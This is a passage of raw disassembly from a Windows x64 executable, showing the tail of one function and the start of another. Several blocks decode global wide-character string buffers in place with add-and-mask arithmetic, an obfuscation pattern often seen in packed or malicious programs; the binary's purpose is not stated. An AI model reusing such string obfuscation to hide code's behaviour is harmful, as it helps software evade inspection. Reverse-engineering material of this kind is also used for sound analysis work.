   140006936:	48 89 c3             	mov    %rax,%rbx
   140006939:	4c 8d 35 f0 d4 2b 00 	lea    0x2bd4f0(%rip),%r14        # 0x1402c3e30
   140006940:	31 ff                	xor    %edi,%edi
   140006942:	49 89 f7             	mov    %rsi,%r15
   140006945:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000694c:	00 00 00 00 
   140006950:	4c 89 f9             	mov    %r15,%rcx
   140006953:	4c 89 f2             	mov    %r14,%rdx
   140006956:	49 89 d8             	mov    %rbx,%r8
   140006959:	e8 b2 36 00 00       	call   0x14000a010
   14000695e:	85 c0                	test   %eax,%eax
   140006960:	0f 84 04 01 00 00    	je     0x140006a6a
   140006966:	4c 89 f9             	mov    %r15,%rcx
   140006969:	e8 12 36 00 00       	call   0x140009f80
   14000696e:	66 41 83 7c 47 02 00 	cmpw   $0x0,0x2(%r15,%rax,2)
   140006975:	4d 8d 7c 47 02       	lea    0x2(%r15,%rax,2),%r15
   14000697a:	75 d4                	jne    0x140006950
   14000697c:	e9 ed 00 00 00       	jmp    0x140006a6e
   140006981:	80 3d e4 c8 2b 00 00 	cmpb   $0x0,0x2bc8e4(%rip)        # 0x1402c326c
   140006988:	0f 84 aa 16 00 00    	je     0x140008038
   14000698e:	80 3d df c9 2b 00 00 	cmpb   $0x0,0x2bc9df(%rip)        # 0x1402c3374
   140006995:	74 47                	je     0x1400069de
   140006997:	f3 0f 7e 05 c9 c9 2b 	movq   0x2bc9c9(%rip),%xmm0        # 0x1402c3368
   14000699e:	00 
   14000699f:	66 0f fd 05 89 4e 00 	paddw  0x4e89(%rip),%xmm0        # 0x14000b830
   1400069a6:	00 
   1400069a7:	66 0f db 05 b1 4c 00 	pand   0x4cb1(%rip),%xmm0        # 0x14000b660
   1400069ae:	00 
   1400069af:	66 0f d6 05 b1 c9 2b 	movq   %xmm0,0x2bc9b1(%rip)        # 0x1402c3368
   1400069b6:	00 
   1400069b7:	f3 0f 7e 05 b1 c9 2b 	movq   0x2bc9b1(%rip),%xmm0        # 0x1402c3370
   1400069be:	00 
   1400069bf:	66 0f fd 05 59 50 00 	paddw  0x5059(%rip),%xmm0        # 0x14000ba20
   1400069c6:	00 
   1400069c7:	66 0f db 05 c1 4c 00 	pand   0x4cc1(%rip),%xmm0        # 0x14000b690
   1400069ce:	00 
   1400069cf:	66 0f 7e 05 99 c9 2b 	movd   %xmm0,0x2bc999(%rip)        # 0x1402c3370
   1400069d6:	00 
   1400069d7:	c6 05 96 c9 2b 00 00 	movb   $0x0,0x2bc996(%rip)        # 0x1402c3374
   1400069de:	48 8d 1d 83 c9 2b 00 	lea    0x2bc983(%rip),%rbx        # 0x1402c3368
   1400069e5:	48 89 d9             	mov    %rbx,%rcx
   1400069e8:	e8 93 35 00 00       	call   0x140009f80
   1400069ed:	89 c1                	mov    %eax,%ecx
   1400069ef:	c1 e1 11             	shl    $0x11,%ecx
   1400069f2:	25 ff 7f 00 00       	and    $0x7fff,%eax
   1400069f7:	8d 04 41             	lea    (%rcx,%rax,2),%eax
   1400069fa:	05 00 00 02 00       	add    $0x20000,%eax
   1400069ff:	48 89 85 40 17 00 00 	mov    %rax,0x1740(%rbp)
   140006a06:	48 89 9d 48 17 00 00 	mov    %rbx,0x1748(%rbp)
   140006a0d:	48 8b 8d 00 17 00 00 	mov    0x1700(%rbp),%rcx
   140006a14:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140006a19:	c7 44 24 20 00 02 00 	movl   $0x200,0x20(%rsp)
   140006a20:	00 
   140006a21:	48 8d 95 40 17 00 00 	lea    0x1740(%rbp),%rdx
   140006a28:	4c 8d 8d 50 10 00 00 	lea    0x1050(%rbp),%r9
   140006a2f:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140006a35:	e8 6e ab ff ff       	call   0x1400015a8
   140006a3a:	89 c3                	mov    %eax,%ebx
   140006a3c:	44 8b b5 5c 10 00 00 	mov    0x105c(%rbp),%r14d
   140006a43:	48 8b 8d 00 17 00 00 	mov    0x1700(%rbp),%rcx
   140006a4a:	e8 0f aa ff ff       	call   0x14000145e
   140006a4f:	85 db                	test   %ebx,%ebx
   140006a51:	0f 88 fd f7 ff ff    	js     0x140006254
   140006a57:	41 83 fe 02          	cmp    $0x2,%r14d
   140006a5b:	0f 84 97 f9 ff ff    	je     0x1400063f8
   140006a61:	e9 ee f7 ff ff       	jmp    0x140006254
   140006a66:	31 ff                	xor    %edi,%edi
   140006a68:	eb 04                	jmp    0x140006a6e
   140006a6a:	49 8d 3c 5f          	lea    (%r15,%rbx,2),%rdi
   140006a6e:	80 3d 25 c8 2b 00 00 	cmpb   $0x0,0x2bc825(%rip)        # 0x1402c329a
   140006a75:	0f 84 2d 14 00 00    	je     0x140007ea8
   140006a7b:	80 3d e2 d3 2b 00 00 	cmpb   $0x0,0x2bd3e2(%rip)        # 0x1402c3e64
   140006a82:	74 63                	je     0x140006ae7
   140006a84:	66 0f 6f 05 34 50 00 	movdqa 0x5034(%rip),%xmm0        # 0x14000bac0
   140006a8b:	00 
   140006a8c:	66 0f 6f 0d ac d3 2b 	movdqa 0x2bd3ac(%rip),%xmm1        # 0x1402c3e40
   140006a93:	00 
   140006a94:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006a98:	66 0f 6f 15 80 4b 00 	movdqa 0x4b80(%rip),%xmm2        # 0x14000b620
   140006a9f:	00 
   140006aa0:	66 0f db ca          	pand   %xmm2,%xmm1
   140006aa4:	66 0f 7f 0d 94 d3 2b 	movdqa %xmm1,0x2bd394(%rip)        # 0x1402c3e40
   140006aab:	00 
   140006aac:	66 0f fd 05 9c d3 2b 	paddw  0x2bd39c(%rip),%xmm0        # 0x1402c3e50
   140006ab3:	00 
   140006ab4:	66 0f db c2          	pand   %xmm2,%xmm0
   140006ab8:	66 0f 7f 05 90 d3 2b 	movdqa %xmm0,0x2bd390(%rip)        # 0x1402c3e50
   140006abf:	00 
   140006ac0:	66 0f 6f 05 98 d3 2b 	movdqa 0x2bd398(%rip),%xmm0        # 0x1402c3e60
   140006ac7:	00 
   140006ac8:	66 0f fd 05 e0 4f 00 	paddw  0x4fe0(%rip),%xmm0        # 0x14000bab0
   140006acf:	00 
   140006ad0:	66 0f db 05 b8 4b 00 	pand   0x4bb8(%rip),%xmm0        # 0x14000b690
   140006ad7:	00 
   140006ad8:	66 0f 7e 05 80 d3 2b 	movd   %xmm0,0x2bd380(%rip)        # 0x1402c3e60
   140006adf:	00 
   140006ae0:	c6 05 7d d3 2b 00 00 	movb   $0x0,0x2bd37d(%rip)        # 0x1402c3e64
   140006ae7:	48 8d 9d 50 10 00 00 	lea    0x1050(%rbp),%rbx
   140006aee:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140006af4:	48 89 d9             	mov    %rbx,%rcx
   140006af7:	31 d2                	xor    %edx,%edx
   140006af9:	e8 62 35 00 00       	call   0x14000a060
   140006afe:	48 89 d9             	mov    %rbx,%rcx
   140006b01:	48 89 fa             	mov    %rdi,%rdx
   140006b04:	e8 67 34 00 00       	call   0x140009f70
   140006b09:	48 8d 15 30 d3 2b 00 	lea    0x2bd330(%rip),%rdx        # 0x1402c3e40
   140006b10:	48 89 d9             	mov    %rbx,%rcx
   140006b13:	e8 48 34 00 00       	call   0x140009f60
   140006b18:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   140006b1f:	00 00 00 00 
   140006b23:	48 8d 0d e6 2f 28 00 	lea    0x282fe6(%rip),%rcx        # 0x140289b10
   140006b2a:	4c 8d 85 40 17 00 00 	lea    0x1740(%rbp),%r8
   140006b31:	ba c0 4b 00 00       	mov    $0x4bc0,%edx
   140006b36:	e8 35 c4 ff ff       	call   0x140002f70
   140006b3b:	48 89 c7             	mov    %rax,%rdi
   140006b3e:	4c 8b b5 40 17 00 00 	mov    0x1740(%rbp),%r14
   140006b45:	48 89 d9             	mov    %rbx,%rcx
   140006b48:	48 89 c2             	mov    %rax,%rdx
   140006b4b:	45 89 f0             	mov    %r14d,%r8d
   140006b4e:	e8 fd c7 ff ff       	call   0x140003350
   140006b53:	4c 89 b5 70 14 00 00 	mov    %r14,0x1470(%rbp)
   140006b5a:	48 89 bd 10 17 00 00 	mov    %rdi,0x1710(%rbp)
   140006b61:	48 8d 95 10 17 00 00 	lea    0x1710(%rbp),%rdx
   140006b68:	4c 8d 85 70 14 00 00 	lea    0x1470(%rbp),%r8
   140006b6f:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140006b76:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   140006b7c:	e8 46 a9 ff ff       	call   0x1400014c7
   140006b81:	48 8d 8d 50 10 00 00 	lea    0x1050(%rbp),%rcx
   140006b88:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140006b8e:	31 d2                	xor    %edx,%edx
   140006b90:	e8 cb 34 00 00       	call   0x14000a060
   140006b95:	80 3d ff c6 2b 00 00 	cmpb   $0x0,0x2bc6ff(%rip)        # 0x1402c329b
   140006b9c:	0f 84 37 13 00 00    	je     0x140007ed9
   140006ba2:	80 3d df d2 2b 00 00 	cmpb   $0x0,0x2bd2df(%rip)        # 0x1402c3e88
   140006ba9:	74 47                	je     0x140006bf2
   140006bab:	66 0f 6f 05 bd d2 2b 	movdqa 0x2bd2bd(%rip),%xmm0        # 0x1402c3e70
   140006bb2:	00 
   140006bb3:	66 0f fd 05 25 4f 00 	paddw  0x4f25(%rip),%xmm0        # 0x14000bae0
   140006bba:	00 
   140006bbb:	66 0f db 05 5d 4a 00 	pand   0x4a5d(%rip),%xmm0        # 0x14000b620
   140006bc2:	00 
   140006bc3:	66 0f 7f 05 a5 d2 2b 	movdqa %xmm0,0x2bd2a5(%rip)        # 0x1402c3e70
   140006bca:	00 
   140006bcb:	f3 0f 7e 05 ad d2 2b 	movq   0x2bd2ad(%rip),%xmm0        # 0x1402c3e80
   140006bd2:	00 
   140006bd3:	66 0f fd 05 15 4f 00 	paddw  0x4f15(%rip),%xmm0        # 0x14000baf0
   140006bda:	00 
   140006bdb:	66 0f db 05 7d 4a 00 	pand   0x4a7d(%rip),%xmm0        # 0x14000b660
   140006be2:	00 
   140006be3:	66 0f d6 05 95 d2 2b 	movq   %xmm0,0x2bd295(%rip)        # 0x1402c3e80
   140006bea:	00 
   140006beb:	c6 05 96 d2 2b 00 00 	movb   $0x0,0x2bd296(%rip)        # 0x1402c3e88
   140006bf2:	48 8d 0d 77 d2 2b 00 	lea    0x2bd277(%rip),%rcx        # 0x1402c3e70
   140006bf9:	e8 82 33 00 00       	call   0x140009f80
   140006bfe:	66 83 3e 00          	cmpw   $0x0,(%rsi)
   140006c02:	74 35                	je     0x140006c39
   140006c04:	48 89 c3             	mov    %rax,%rbx
   140006c07:	4c 8d 35 62 d2 2b 00 	lea    0x2bd262(%rip),%r14        # 0x1402c3e70
   140006c0e:	31 ff                	xor    %edi,%edi
   140006c10:	48 89 f1             	mov    %rsi,%rcx
   140006c13:	4c 89 f2             	mov    %r14,%rdx
   140006c16:	49 89 d8             	mov    %rbx,%r8
   140006c19:	e8 f2 33 00 00       	call   0x14000a010
   140006c1e:	85 c0                	test   %eax,%eax
   140006c20:	74 1b                	je     0x140006c3d
   140006c22:	48 89 f1             	mov    %rsi,%rcx
   140006c25:	e8 56 33 00 00       	call   0x140009f80
   140006c2a:	66 83 7c 46 02 00    	cmpw   $0x0,0x2(%rsi,%rax,2)
   140006c30:	48 8d 74 46 02       	lea    0x2(%rsi,%rax,2),%rsi
   140006c35:	75 d9                	jne    0x140006c10
   140006c37:	eb 08                	jmp    0x140006c41
   140006c39:	31 ff                	xor    %edi,%edi
   140006c3b:	eb 04                	jmp    0x140006c41
   140006c3d:	48 8d 3c 5e          	lea    (%rsi,%rbx,2),%rdi
   140006c41:	48 8d 8d 50 10 00 00 	lea    0x1050(%rbp),%rcx
   140006c48:	48 89 fa             	mov    %rdi,%rdx
   140006c4b:	e8 10 33 00 00       	call   0x140009f60
   140006c50:	48 8d 8d 70 14 00 00 	lea    0x1470(%rbp),%rcx
   140006c57:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140006c5d:	31 d2                	xor    %edx,%edx
   140006c5f:	e8 fc 33 00 00       	call   0x14000a060
   140006c64:	80 3d 31 c6 2b 00 00 	cmpb   $0x0,0x2bc631(%rip)        # 0x1402c329c
   140006c6b:	0f 84 b5 12 00 00    	je     0x140007f26
   140006c71:	80 3d 30 d2 2b 00 00 	cmpb   $0x0,0x2bd230(%rip)        # 0x1402c3ea8
   140006c78:	74 47                	je     0x140006cc1
   140006c7a:	66 0f 6f 05 0e d2 2b 	movdqa 0x2bd20e(%rip),%xmm0        # 0x1402c3e90
   140006c81:	00 
   140006c82:	66 0f fd 05 86 4e 00 	paddw  0x4e86(%rip),%xmm0        # 0x14000bb10
   140006c89:	00 
   140006c8a:	66 0f db 05 8e 49 00 	pand   0x498e(%rip),%xmm0        # 0x14000b620
   140006c91:	00 
   140006c92:	66 0f 7f 05 f6 d1 2b 	movdqa %xmm0,0x2bd1f6(%rip)        # 0x1402c3e90
   140006c99:	00 
   140006c9a:	f3 0f 7e 05 fe d1 2b 	movq   0x2bd1fe(%rip),%xmm0        # 0x1402c3ea0
   140006ca1:	00 
   140006ca2:	66 0f fd 05 76 4e 00 	paddw  0x4e76(%rip),%xmm0        # 0x14000bb20
   140006ca9:	00 
   140006caa:	66 0f db 05 ae 49 00 	pand   0x49ae(%rip),%xmm0        # 0x14000b660
   140006cb1:	00 
   140006cb2:	66 0f d6 05 e6 d1 2b 	movq   %xmm0,0x2bd1e6(%rip)        # 0x1402c3ea0
   140006cb9:	00 
   140006cba:	c6 05 e7 d1 2b 00 00 	movb   $0x0,0x2bd1e7(%rip)        # 0x1402c3ea8
   140006cc1:	48 8d bd 70 14 00 00 	lea    0x1470(%rbp),%rdi
   140006cc8:	48 8d b5 60 12 00 00 	lea    0x1260(%rbp),%rsi
   140006ccf:	48 89 f9             	mov    %rdi,%rcx
   140006cd2:	48 89 f2             	mov    %rsi,%rdx
   140006cd5:	e8 96 32 00 00       	call   0x140009f70
   140006cda:	48 8d 15 af d1 2b 00 	lea    0x2bd1af(%rip),%rdx        # 0x1402c3e90
   140006ce1:	48 89 f9             	mov    %rdi,%rcx
   140006ce4:	e8 77 32 00 00       	call   0x140009f60
   140006ce9:	80 3d ad c5 2b 00 00 	cmpb   $0x0,0x2bc5ad(%rip)        # 0x1402c329d
   140006cf0:	0f 84 7d 12 00 00    	je     0x140007f73
   140006cf6:	80 3d f9 d1 2b 00 00 	cmpb   $0x0,0x2bd1f9(%rip)        # 0x1402c3ef6
   140006cfd:	0f 84 b1 00 00 00    	je     0x140006db4
   140006d03:	66 0f 6f 05 25 4e 00 	movdqa 0x4e25(%rip),%xmm0        # 0x14000bb30
   140006d0a:	00 
   140006d0b:	66 0f 6f 0d 9d d1 2b 	movdqa 0x2bd19d(%rip),%xmm1        # 0x1402c3eb0
   140006d12:	00 
   140006d13:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006d17:	66 0f 6f 15 01 49 00 	movdqa 0x4901(%rip),%xmm2        # 0x14000b620
   140006d1e:	00 
   140006d1f:	66 0f db ca          	pand   %xmm2,%xmm1
   140006d23:	66 0f 7f 0d 85 d1 2b 	movdqa %xmm1,0x2bd185(%rip)        # 0x1402c3eb0
   140006d2a:	00 
   140006d2b:	66 0f 6f 0d 8d d1 2b 	movdqa 0x2bd18d(%rip),%xmm1        # 0x1402c3ec0
   140006d32:	00 
   140006d33:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006d37:	66 0f db ca          	pand   %xmm2,%xmm1
   140006d3b:	66 0f 7f 0d 7d d1 2b 	movdqa %xmm1,0x2bd17d(%rip)        # 0x1402c3ec0
   140006d42:	00 
   140006d43:	66 0f 6f 0d 85 d1 2b 	movdqa 0x2bd185(%rip),%xmm1        # 0x1402c3ed0
   140006d4a:	00 
   140006d4b:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006d4f:	66 0f db ca          	pand   %xmm2,%xmm1
   140006d53:	66 0f 7f 0d 75 d1 2b 	movdqa %xmm1,0x2bd175(%rip)        # 0x1402c3ed0
   140006d5a:	00 
   140006d5b:	66 0f fd 05 7d d1 2b 	paddw  0x2bd17d(%rip),%xmm0        # 0x1402c3ee0
   140006d62:	00 
   140006d63:	66 0f db c2          	pand   %xmm2,%xmm0
   140006d67:	66 0f 7f 05 71 d1 2b 	movdqa %xmm0,0x2bd171(%rip)        # 0x1402c3ee0
   140006d6e:	00 
   140006d6f:	b8 b7 00 00 00       	mov    $0xb7,%eax
   140006d74:	8b 0d 76 d1 2b 00    	mov    0x2bd176(%rip),%ecx        # 0x1402c3ef0
   140006d7a:	01 c1                	add    %eax,%ecx
   140006d7c:	0f b6 c9             	movzbl %cl,%ecx
   140006d7f:	66 89 0d 6a d1 2b 00 	mov    %cx,0x2bd16a(%rip)        # 0x1402c3ef0
   140006d86:	0f b7 0d 65 d1 2b 00 	movzwl 0x2bd165(%rip),%ecx        # 0x1402c3ef2
   140006d8d:	81 c1 b7 00 00 00    	add    $0xb7,%ecx
   140006d93:	0f b6 c9             	movzbl %cl,%ecx
   140006d96:	66 89 0d 55 d1 2b 00 	mov    %cx,0x2bd155(%rip)        # 0x1402c3ef2
   140006d9d:	03 05 51 d1 2b 00    	add    0x2bd151(%rip),%eax        # 0x1402c3ef4
   140006da3:	0f b6 c0             	movzbl %al,%eax
   140006da6:	66 89 05 47 d1 2b 00 	mov    %ax,0x2bd147(%rip)        # 0x1402c3ef4
   140006dad:	c6 05 42 d1 2b 00 00 	movb   $0x0,0x2bd142(%rip)        # 0x1402c3ef6
   140006db4:	80 3d e3 c4 2b 00 00 	cmpb   $0x0,0x2bc4e3(%rip)        # 0x1402c329e
   140006dbb:	0f 84 e3 11 00 00    	je     0x140007fa4
   140006dc1:	80 3d 4e d1 2b 00 00 	cmpb   $0x0,0x2bd14e(%rip)        # 0x1402c3f16
   140006dc8:	74 5c                	je     0x140006e26
   140006dca:	66 0f 6f 05 2e d1 2b 	movdqa 0x2bd12e(%rip),%xmm0        # 0x1402c3f00
   140006dd1:	00 
   140006dd2:	66 0f fd 05 56 4d 00 	paddw  0x4d56(%rip),%xmm0        # 0x14000bb30
   140006dd9:	00 
   140006dda:	66 0f db 05 3e 48 00 	pand   0x483e(%rip),%xmm0        # 0x14000b620
   140006de1:	00 
   140006de2:	66 0f 7f 05 16 d1 2b 	movdqa %xmm0,0x2bd116(%rip)        # 0x1402c3f00
   140006de9:	00 
   140006dea:	66 0f 6f 05 1e d1 2b 	movdqa 0x2bd11e(%rip),%xmm0        # 0x1402c3f10
   140006df1:	00 
   140006df2:	66 0f fd 05 56 4d 00 	paddw  0x4d56(%rip),%xmm0        # 0x14000bb50
   140006df9:	00 
   140006dfa:	66 0f db 05 8e 48 00 	pand   0x488e(%rip),%xmm0        # 0x14000b690
   140006e01:	00 
   140006e02:	66 0f 7e 05 06 d1 2b 	movd   %xmm0,0x2bd106(%rip)        # 0x1402c3f10
   140006e09:	00 
   140006e0a:	b8 b7 00 00 00       	mov    $0xb7,%eax
   140006e0f:	03 05 ff d0 2b 00    	add    0x2bd0ff(%rip),%eax        # 0x1402c3f14
   140006e15:	0f b6 c0             	movzbl %al,%eax
   140006e18:	66 89 05 f5 d0 2b 00 	mov    %ax,0x2bd0f5(%rip)        # 0x1402c3f14
   140006e1f:	c6 05 f0 d0 2b 00 00 	movb   $0x0,0x2bd0f0(%rip)        # 0x1402c3f16
   140006e26:	80 3d 72 c4 2b 00 00 	cmpb   $0x0,0x2bc472(%rip)        # 0x1402c329f
   140006e2d:	0f 84 c0 11 00 00    	je     0x140007ff3
   140006e33:	80 3d da d5 2b 00 00 	cmpb   $0x0,0x2bd5da(%rip)        # 0x1402c4414
   140006e3a:	0f 84 b7 01 00 00    	je     0x140006ff7
   140006e40:	b8 18 00 00 00       	mov    $0x18,%eax
   140006e45:	48 8d 0d cc d0 2b 00 	lea    0x2bd0cc(%rip),%rcx        # 0x1402c3f18
   140006e4c:	66 0f 6f 05 dc 4c 00 	movdqa 0x4cdc(%rip),%xmm0        # 0x14000bb30
   140006e53:	00 
   140006e54:	66 0f 6f 0d c4 47 00 	movdqa 0x47c4(%rip),%xmm1        # 0x14000b620
   140006e5b:	00 
   140006e5c:	0f 1f 40 00          	nopl   0x0(%rax)
   140006e60:	f3 0f 6f 54 41 d0    	movdqu -0x30(%rcx,%rax,2),%xmm2
   140006e66:	f3 0f 6f 5c 41 e0    	movdqu -0x20(%rcx,%rax,2),%xmm3
   140006e6c:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140006e70:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140006e74:	66 0f db d1          	pand   %xmm1,%xmm2
   140006e78:	66 0f db d9          	pand   %xmm1,%xmm3
   140006e7c:	f3 0f 7f 54 41 d0    	movdqu %xmm2,-0x30(%rcx,%rax,2)
   140006e82:	f3 0f 7f 5c 41 e0    	movdqu %xmm3,-0x20(%rcx,%rax,2)
   140006e88:	48 3d 78 02 00 00    	cmp    $0x278,%rax
   140006e8e:	74 2c                	je     0x140006ebc
   140006e90:	f3 0f 6f 54 41 f0    	movdqu -0x10(%rcx,%rax,2),%xmm2
   140006e96:	f3 0f 6f 1c 41       	movdqu (%rcx,%rax,2),%xmm3
   140006e9b:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140006e9f:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140006ea3:	66 0f db d1          	pand   %xmm1,%xmm2
   140006ea7:	66 0f db d9          	pand   %xmm1,%xmm3
   140006eab:	f3 0f 7f 54 41 f0    	movdqu %xmm2,-0x10(%rcx,%rax,2)
   140006eb1:	f3 0f 7f 1c 41       	movdqu %xmm3,(%rcx,%rax,2)
   140006eb6:	48 83 c0 20          	add    $0x20,%rax
   140006eba:	eb a4                	jmp    0x140006e60
   140006ebc:	0f b7 05 35 d5 2b 00 	movzwl 0x2bd535(%rip),%eax        # 0x1402c43f8
   140006ec3:	05 b7 00 00 00       	add    $0xb7,%eax
   140006ec8:	0f b6 c0             	movzbl %al,%eax
   140006ecb:	66 89 05 26 d5 2b 00 	mov    %ax,0x2bd526(%rip)        # 0x1402c43f8
   140006ed2:	0f b7 05 21 d5 2b 00 	movzwl 0x2bd521(%rip),%eax        # 0x1402c43fa
   140006ed9:	05 b7 00 00 00       	add    $0xb7,%eax
   140006ede:	0f b6 c0             	movzbl %al,%eax
   140006ee1:	66 89 05 12 d5 2b 00 	mov    %ax,0x2bd512(%rip)        # 0x1402c43fa
   140006ee8:	0f b7 05 0d d5 2b 00 	movzwl 0x2bd50d(%rip),%eax        # 0x1402c43fc
   140006eef:	05 b7 00 00 00       	add    $0xb7,%eax
   140006ef4:	0f b6 c0             	movzbl %al,%eax
   140006ef7:	66 89 05 fe d4 2b 00 	mov    %ax,0x2bd4fe(%rip)        # 0x1402c43fc
   140006efe:	0f b7 05 f9 d4 2b 00 	movzwl 0x2bd4f9(%rip),%eax        # 0x1402c43fe
   140006f05:	05 b7 00 00 00       	add    $0xb7,%eax
   140006f0a:	0f b6 c0             	movzbl %al,%eax
   140006f0d:	66 89 05 ea d4 2b 00 	mov    %ax,0x2bd4ea(%rip)        # 0x1402c43fe
   140006f14:	0f b7 05 e5 d4 2b 00 	movzwl 0x2bd4e5(%rip),%eax        # 0x1402c4400
   140006f1b:	05 b7 00 00 00       	add    $0xb7,%eax
   140006f20:	0f b6 c0             	movzbl %al,%eax
   140006f23:	66 89 05 d6 d4 2b 00 	mov    %ax,0x2bd4d6(%rip)        # 0x1402c4400
   140006f2a:	0f b7 05 d1 d4 2b 00 	movzwl 0x2bd4d1(%rip),%eax        # 0x1402c4402
   140006f31:	05 b7 00 00 00       	add    $0xb7,%eax
   140006f36:	0f b6 c0             	movzbl %al,%eax
   140006f39:	66 89 05 c2 d4 2b 00 	mov    %ax,0x2bd4c2(%rip)        # 0x1402c4402
   140006f40:	0f b7 05 bd d4 2b 00 	movzwl 0x2bd4bd(%rip),%eax        # 0x1402c4404
   140006f47:	05 b7 00 00 00       	add    $0xb7,%eax
   140006f4c:	0f b6 c0             	movzbl %al,%eax
   140006f4f:	66 89 05 ae d4 2b 00 	mov    %ax,0x2bd4ae(%rip)        # 0x1402c4404
   140006f56:	0f b7 05 a9 d4 2b 00 	movzwl 0x2bd4a9(%rip),%eax        # 0x1402c4406
   140006f5d:	05 b7 00 00 00       	add    $0xb7,%eax
   140006f62:	0f b6 c0             	movzbl %al,%eax
   140006f65:	66 89 05 9a d4 2b 00 	mov    %ax,0x2bd49a(%rip)        # 0x1402c4406
   140006f6c:	0f b7 05 95 d4 2b 00 	movzwl 0x2bd495(%rip),%eax        # 0x1402c4408
   140006f73:	05 b7 00 00 00       	add    $0xb7,%eax
   140006f78:	0f b6 c0             	movzbl %al,%eax
   140006f7b:	66 89 05 86 d4 2b 00 	mov    %ax,0x2bd486(%rip)        # 0x1402c4408
   140006f82:	0f b7 05 81 d4 2b 00 	movzwl 0x2bd481(%rip),%eax        # 0x1402c440a
   140006f89:	05 b7 00 00 00       	add    $0xb7,%eax
   140006f8e:	0f b6 c0             	movzbl %al,%eax
   140006f91:	66 89 05 72 d4 2b 00 	mov    %ax,0x2bd472(%rip)        # 0x1402c440a
   140006f98:	0f b7 05 6d d4 2b 00 	movzwl 0x2bd46d(%rip),%eax        # 0x1402c440c
   140006f9f:	05 b7 00 00 00       	add    $0xb7,%eax
   140006fa4:	0f b6 c0             	movzbl %al,%eax
   140006fa7:	66 89 05 5e d4 2b 00 	mov    %ax,0x2bd45e(%rip)        # 0x1402c440c
   140006fae:	0f b7 05 59 d4 2b 00 	movzwl 0x2bd459(%rip),%eax        # 0x1402c440e
   140006fb5:	05 b7 00 00 00       	add    $0xb7,%eax
   140006fba:	0f b6 c0             	movzbl %al,%eax
   140006fbd:	66 89 05 4a d4 2b 00 	mov    %ax,0x2bd44a(%rip)        # 0x1402c440e
   140006fc4:	0f b7 05 45 d4 2b 00 	movzwl 0x2bd445(%rip),%eax        # 0x1402c4410
   140006fcb:	05 b7 00 00 00       	add    $0xb7,%eax
   140006fd0:	0f b6 c0             	movzbl %al,%eax
   140006fd3:	66 89 05 36 d4 2b 00 	mov    %ax,0x2bd436(%rip)        # 0x1402c4410
   140006fda:	0f b7 05 31 d4 2b 00 	movzwl 0x2bd431(%rip),%eax        # 0x1402c4412
   140006fe1:	05 b7 00 00 00       	add    $0xb7,%eax
   140006fe6:	0f b6 c0             	movzbl %al,%eax
   140006fe9:	66 89 05 22 d4 2b 00 	mov    %ax,0x2bd422(%rip)        # 0x1402c4412
   140006ff0:	c6 05 1d d4 2b 00 00 	movb   $0x0,0x2bd41d(%rip)        # 0x1402c4414
   140006ff7:	8b 85 34 17 00 00    	mov    0x1734(%rbp),%eax
   140006ffd:	88 44 24 38          	mov    %al,0x38(%rsp)
   140007001:	48 8d 05 10 cf 2b 00 	lea    0x2bcf10(%rip),%rax        # 0x1402c3f18
   140007008:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000700d:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140007012:	48 8d 05 e7 ce 2b 00 	lea    0x2bcee7(%rip),%rax        # 0x1402c3f00
   140007019:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000701e:	48 8d 0d 8b ce 2b 00 	lea    0x2bce8b(%rip),%rcx        # 0x1402c3eb0
   140007025:	48 8d 15 84 3d 01 00 	lea    0x13d84(%rip),%rdx        # 0x14001adb0
   14000702c:	4c 8d 8d 70 14 00 00 	lea    0x1470(%rbp),%r9
   140007033:	41 b8 58 ed 26 00    	mov    $0x26ed58,%r8d
   140007039:	e8 e2 cb ff ff       	call   0x140003c20
   14000703e:	48 8b 8d 98 16 00 00 	mov    0x1698(%rbp),%rcx
   140007045:	e8 14 a4 ff ff       	call   0x14000145e
   14000704a:	31 c0                	xor    %eax,%eax
   14000704c:	0f 28 b5 50 17 00 00 	movaps 0x1750(%rbp),%xmm6
   140007053:	48 81 c4 e8 17 00 00 	add    $0x17e8,%rsp
   14000705a:	5b                   	pop    %rbx
   14000705b:	5f                   	pop    %rdi
   14000705c:	5e                   	pop    %rsi
   14000705d:	41 5c                	pop    %r12
   14000705f:	41 5d                	pop    %r13
   140007061:	41 5e                	pop    %r14
   140007063:	41 5f                	pop    %r15
   140007065:	5d                   	pop    %rbp
   140007066:	c3                   	ret
   140007067:	c6 05 a8 c3 2b 00 01 	movb   $0x1,0x2bc3a8(%rip)        # 0x1402c3416
   14000706e:	0f 10 05 77 4b 00 00 	movups 0x4b77(%rip),%xmm0        # 0x14000bbec
   140007075:	0f 29 05 44 c3 2b 00 	movaps %xmm0,0x2bc344(%rip)        # 0x1402c33c0
   14000707c:	0f 10 05 79 4b 00 00 	movups 0x4b79(%rip),%xmm0        # 0x14000bbfc
   140007083:	0f 29 05 46 c3 2b 00 	movaps %xmm0,0x2bc346(%rip)        # 0x1402c33d0
   14000708a:	0f 10 05 7b 4b 00 00 	movups 0x4b7b(%rip),%xmm0        # 0x14000bc0c
   140007091:	0f 29 05 48 c3 2b 00 	movaps %xmm0,0x2bc348(%rip)        # 0x1402c33e0
   140007098:	0f 10 05 7d 4b 00 00 	movups 0x4b7d(%rip),%xmm0        # 0x14000bc1c
   14000709f:	0f 29 05 4a c3 2b 00 	movaps %xmm0,0x2bc34a(%rip)        # 0x1402c33f0
   1400070a6:	f3 0f 6f 05 7e 4b 00 	movdqu 0x4b7e(%rip),%xmm0        # 0x14000bc2c
   1400070ad:	00 
